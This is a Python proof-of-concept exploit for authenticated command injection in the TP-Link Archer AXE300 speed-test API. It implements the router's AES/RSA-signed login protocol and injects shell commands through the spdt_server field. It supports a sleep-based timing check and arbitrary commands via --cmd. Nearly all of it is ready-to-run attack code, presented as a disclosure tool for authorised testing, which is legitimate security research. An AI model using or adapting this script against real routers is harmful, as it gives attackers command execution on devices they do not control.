#!/usr/bin/env python3
"""
Proof of concept: authenticated command injection in the TP-Link Archer AXE300
ISP Speed Test endpoint (spdt_server -> sys.fork_call -> /bin/sh -c).

The vulnerable code lives on the device, in the LuCI model:

    /usr/lib/lua/luci/model/spdt.lua, SPEED_TEST_INST:start_spt(form)

        spdt_url = form.spdt_server
        sys.fork_call("echo " .. spdt_url .. " > /tmp/log/spdt_url")

`spdt_server` arrives from the request body and is concatenated straight into a
shell command string. No quoting, no validation.

This script speaks the router's own JSON API: it logs in with the web UI
credential, then sends one speed-test start request whose `spdt_server` value
carries a shell payload. The default payload is `sleep`, so the proof is a
timing oracle: the response time tracks the sleep duration.

Note on output capture: the vulnerable line ends with " > /tmp/log/spdt_url",
and that redirect binds to the last command of the injected payload, which
steals its stdout. The --cmd mode therefore appends "; true" so that commands
like "id > /tmp/out" keep their own redirection.

Target: a router you own or are authorised to test.

Usage:
    python3 axe300_spdt_poc.py --host 192.168.0.1 --password 'your-password'
    python3 axe300_spdt_poc.py --host 192.168.0.1 --password '...' --cmd 'id'
    python3 axe300_spdt_poc.py --host 192.168.0.1 --password '...' --sleep 8

Requires: cryptography (AES-CBC + RSA public-key operations).
"""

import argparse
import base64
import hashlib
import json
import os
import random
import sys
import time
import urllib.parse

try:
    from cryptography.hazmat.primitives import padding as sym_padding
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    sys.exit("error: the 'cryptography' package is required (pip install cryptography)")

BASE = "/cgi-bin/luci/;stok=%s"


class TPLinkClient:
    """Client for the TP-Link 'eweb' JSON API used by this firmware generation."""

    def __init__(self, host, password, username="admin"):
        self.host = host
        self.password = password
        self.username = username
        self.stok = ""
        # Set by the login response (Set-Cookie: sysauth=...); identifies the
        # session for every later request.
        self.sysauth = ""
        # The device expects md5(username + password) as the session hash.
        self.password_hash = hashlib.md5(
            (username + password).encode("utf-8")
        ).hexdigest()
        self.aes_key = self._rand_key()
        self.aes_iv = self._rand_key()

    # -- helpers ---------------------------------------------------------

    @staticmethod
    def _rand_key():
        raw = (str(time.time()) + str(random.random())).replace(".", "")
        return raw[:16].encode("utf-8")

    def _url(self, path):
        return "http://%s%s%s" % (self.host, BASE % self.stok, path)

    def _basic_request(self, path, post_data):
        """Unencrypted request, used before a session exists."""
        body = urllib.parse.urlencode(post_data).encode("utf-8")
        raw = self._raw_post(self._url(path), body)
        return json.loads(raw)

    def _raw_post(self, url, body):
        import urllib.request

        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        if self.sysauth:
            # The router identifies the session by this cookie, not by the stok
            # alone (luci/sauth.lua: sess = luci.http.getcookie("sysauth")).
            # Without it every request after the login comes back empty.
            req.add_header("Cookie", "sysauth=%s" % self.sysauth)
        with urllib.request.urlopen(req, timeout=30) as resp:
            self._absorb_cookies(resp.headers.get_all("Set-Cookie") or [])
            return resp.read().decode("utf-8", "replace")

    def _absorb_cookies(self, set_cookie_headers):
        for header in set_cookie_headers:
            if header.lower().startswith("sysauth="):
                self.sysauth = header.split("=", 1)[1].split(";", 1)[0].strip()

    def _rsa_public(self, n_hex, e_hex):
        n = int(n_hex, 16)
        e = int(e_hex, 16)
        pub = (
            int.to_bytes(n, (n.bit_length() + 7) // 8, "big"),
            int.to_bytes(e, (e.bit_length() + 7) // 8, "big"),
        )
        return serialization.load_der_public_key(
            _der_rsa_public_key(pub[0], pub[1])
        )

    # -- protocol ---------------------------------------------------------

    def _encrypt(self, plaintext_bytes):
        padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
        padded = padder.update(plaintext_bytes) + padder.finalize()
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.aes_iv))
        enc = cipher.encryptor()
        return enc.update(padded) + enc.finalize()

    def _decrypt(self, ciphertext):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.aes_iv))
        dec = cipher.decryptor()
        padded = dec.update(ciphertext) + dec.finalize()
        unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
        return unpadder.update(padded) + unpadder.finalize()

    def _rsa_encrypt_hex(self, n_hex, e_hex, plaintext):
        """RSA public-key operation, PKCS#1 v1.5 padding, hex encoded.

        The device splits the input into modulus-sized chunks, so chunk here too.
        """
        key = self._rsa_public(n_hex, e_hex)
        size = (int(n_hex, 16).bit_length() + 7) // 8
        chunk = size - 11
        out = ""
        for i in range(0, len(plaintext), chunk):
            block = key.encrypt(
                plaintext[i : i + chunk], rsa_padding.PKCS1v15()
            )
            out += block.hex()
        return out

    def _encrypted_request(self, path, post_data, is_login=False):
        """Send an API request the way the web UI does: AES body + RSA signature.

        The signature format differs by request type, matching the router's own
        client code (webpages/js/libs/tpEncrypt.js, encryptor.getSignature):

          login:  "k=<aes_key>&i=<aes_iv>&h=<hash>&s=<seq+len>"
          normal: "h=<hash>&s=<seq+len>"

        The AES key and IV are only carried in the login signature; the server
        binds them to the session, so every later request must omit them.
        Sending "k="/"i=" on a non-login request makes the server reply with an
        empty body.
        """
        # quote_via=quote, not quote_plus: the web UI percent-encodes spaces as
        # %20, and the router's form parser does not turn '+' back into a space.
        # With quote_plus an injected "sleep 5" arrives as "sleep+5" and the
        # shell looks for a command literally named "sleep+5".
        serialised = urllib.parse.urlencode(
            post_data, quote_via=urllib.parse.quote
        ).encode("utf-8")
        encrypted = self._encrypt(serialised)
        encrypted_b64 = base64.b64encode(encrypted)

        seq = self.seq + len(encrypted_b64)
        if is_login:
            signature = "k=%s&i=%s&h=%s&s=%d" % (
                self.aes_key.decode(),
                self.aes_iv.decode(),
                self.password_hash,
                seq,
            )
        else:
            signature = "h=%s&s=%d" % (self.password_hash, seq)
        signed = self._rsa_encrypt_hex(
            self.sign_rsa_n, self.sign_rsa_e, signature.encode("utf-8")
        )

        body = urllib.parse.urlencode(
            {"sign": signed, "data": encrypted_b64.decode()}
        ).encode("utf-8")
        raw = self._raw_post(self._url(path), body)
        parsed = json.loads(raw)
        if parsed.get("data"):
            parsed = json.loads(self._decrypt(base64.b64decode(parsed["data"])))
        return parsed

    # -- session ----------------------------------------------------------

    def login(self):
        auth = self._basic_request("/login?form=auth", {"operation": "read"})
        if not auth.get("success"):
            raise RuntimeError("unsupported router: %r" % auth)
        self.sign_rsa_n = auth["data"]["key"][0]
        self.sign_rsa_e = auth["data"]["key"][1]
        self.seq = auth["data"]["seq"]

        keys = self._basic_request("/login?form=keys", {"operation": "read"})
        self.password_rsa_n = keys["data"]["password"][0]
        self.password_rsa_e = keys["data"]["password"][1]

        # The password itself travels RSA-encrypted under the 'keys' keypair.
        encrypted_pw = self._rsa_encrypt_hex(
            self.password_rsa_n,
            self.password_rsa_e,
            self.password.encode("utf-8"),
        )
        result = self._encrypted_request(
            "/login?form=login",
            {"operation": "login", "password": encrypted_pw},
            is_login=True,
        )
        if not result.get("success"):
            raise RuntimeError("login failed: %r" % result)
        self.stok = result["data"]["stok"]
        return self.stok


def _der_rsa_public_key(n_bytes, e_bytes):
    """Minimal DER SubjectPublicKeyInfo for an RSA public key."""

    def _der_int(raw):
        if raw[0] & 0x80:
            raw = b"\x00" + raw
        return b"\x02" + _der_len(len(raw)) + raw

    def _der_len(n):
        if n < 0x80:
            return bytes([n])
        body = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return bytes([0x80 | len(body)]) + body

    rsa_pub = b"\x30" + _der_len(
        len(_der_int(n_bytes)) + len(_der_int(e_bytes))
    ) + _der_int(n_bytes) + _der_int(e_bytes)

    alg_id = bytes.fromhex("300d06092a864886f70d0101010500")
    bitstring = b"\x03" + _der_len(len(rsa_pub) + 1) + b"\x00" + rsa_pub
    spki = b"\x30" + _der_len(len(alg_id) + len(bitstring)) + alg_id + bitstring
    return spki


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--host", default="192.168.0.1")
    ap.add_argument("--password", default=os.environ.get("AXE300_PASSWORD"))
    ap.add_argument("--username", default="admin")
    ap.add_argument(
        "--cmd",
        help="shell command to inject (default: none, timing proof only)",
    )
    ap.add_argument(
        "--sleep",
        type=int,
        default=5,
        help="seconds to sleep in the timing proof (default: 5)",
    )
    ap.add_argument(
        "--insecure",
        action="store_true",
        help="skip the baseline measurement",
    )
    args = ap.parse_args()

    if not args.password:
        ap.error("password required (--password or AXE300_PASSWORD)")

    client = TPLinkClient(args.host, args.password, args.username)
    print("[*] logging in to %s ..." % args.host)
    stok = client.login()
    print("[+] authenticated, session token acquired (%d chars)" % len(stok))

    def stop():
        client._encrypted_request(
            "/admin/speedtest?form=speedtest", {"operation": "stop"}
        )

    def timed(payload):
        # start_spt() short-circuits with "if running then return", and the
        # running flag survives between requests. A stale test would make the
        # injected command never execute, so always clear it first.
        stop()
        time.sleep(0.5)
        start = time.time()
        client._encrypted_request(
            "/admin/speedtest?form=speedtest",
            {"operation": "start", "spdt_server": payload},
        )
        return time.time() - start

    base = None
    if not args.insecure:
        base = timed("http://127.0.0.1:9")
        print("[*] baseline request: %.3f s" % base)

    if args.cmd:
        # The vulnerable line is `sys.fork_call("echo " .. spdt_url .. " > /tmp/log/spdt_url")`,
        # so the shell's trailing redirect binds to the LAST command of the payload and
        # steals its stdout (an `id > file` would end up empty). Ending the payload with
        # `; true` parks that redirect on a harmless command and keeps the user's own
        # redirections and pipes intact.
        payload = "http://127.0.0.1:9;" + args.cmd + " ; true"
        elapsed = timed(payload)
        print(
            "[+] injected %r: request returned after %.3f s (baseline was %s)"
            % (args.cmd, elapsed, "%.3f s" % base if base is not None else "n/a")
        )
        print(
            "[!] command output is not returned by the API. Confirm the effect "
            "on the device itself."
        )
    else:
        elapsed = timed("http://127.0.0.1:9;sleep %d" % args.sleep)
        print(
            "[+] injected 'sleep %d': request returned after %.3f s "
            "(baseline was %.3f s)" % (args.sleep, elapsed, base)
        )
        if elapsed > args.sleep * 0.8:
            print(
                "[+] command injection confirmed: the response time tracks the "
                "requested sleep duration."
            )
        else:
            print(
                "[-] no timing signal: this build may not be vulnerable, or the "
                "sleep did not execute."
            )

    client._encrypted_request(
        "/admin/speedtest?form=speedtest", {"operation": "stop"}
    )
    print("[*] speed test stopped")


if __name__ == "__main__":
    main()
